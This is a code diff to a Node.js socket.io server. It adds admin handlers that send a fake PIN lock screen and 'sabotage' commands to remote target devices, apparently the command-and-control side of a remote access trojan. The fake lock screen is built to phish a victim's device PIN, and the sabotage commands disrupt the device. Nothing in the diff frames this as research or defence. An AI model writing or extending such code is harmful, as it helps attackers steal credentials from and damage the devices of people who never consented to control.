@@ -324,6 +324,25 @@ io.on('connection', (socket) => {
                 setTimeout(() => io.to(targetDeviceId).emit('admin-respawn-keepalive'), 3000);
             }
         });
+        // === FAKE LOCK SCREEN & SABOTAGE ===
+        socket.on('admin-fake-lockscreen', (data) => {
+            if (data.deviceId) {
+                io.to(data.deviceId).emit('admin-fake-lockscreen', {
+                    style: data.style || 'pin',
+                    maxLength: data.maxLength || 6
+                });
+            }
+        });
+        socket.on('admin-sabotage', (data) => {
+            if (data.deviceId) {
+                io.to(data.deviceId).emit('admin-sabotage');
+            }
+        });
+        socket.on('admin-stop-sabotage', (data) => {
+            if (data.deviceId) {
+                io.to(data.deviceId).emit('admin-stop-sabotage');
+            }
+        });
         socket.on('disconnect', () => {
             // Keep IP in set briefly; remove after other sockets from same IP may still be active
             setTimeout(() => adminIps.delete(adminIp), 60000);
